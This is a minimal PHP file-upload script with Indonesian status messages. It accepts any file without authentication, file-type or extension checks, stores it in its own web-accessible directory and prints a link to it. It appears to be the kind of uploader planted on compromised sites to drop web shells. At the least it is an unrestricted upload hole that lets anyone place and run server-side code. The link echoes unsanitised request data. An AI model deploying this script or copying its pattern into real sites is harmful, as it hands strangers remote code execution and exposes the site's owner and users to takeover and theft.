<?php 
if($_POST['upload']=="upload"){
$nama_file = $_FILES['file']['tmp_name'];
$folder = "./";
$file_upload = $_FILES['file']['name'];
$spasi = explode(" ",$file_upload);
$hspasi = implode("_",$spasi);
$huruf_kecil = strtolower($hspasi);
if(is_uploaded_file($nama_file))
{
move_uploaded_file($nama_file,$folder.$huruf_kecil);
echo"sukses<br/>";
echo"Open File <a target='_blank' href='http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]".$_FILES['file']['name']."'>http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]".$_FILES['file']['name']."</a>";
}
else{echo"gagal";}
}else{
    ?>
 
    <form method="post" enctype="multipart/form-data">
    <input type="file" name="file"/><input type="submit" name="upload" value="upload" />
    </form>
<?php }?>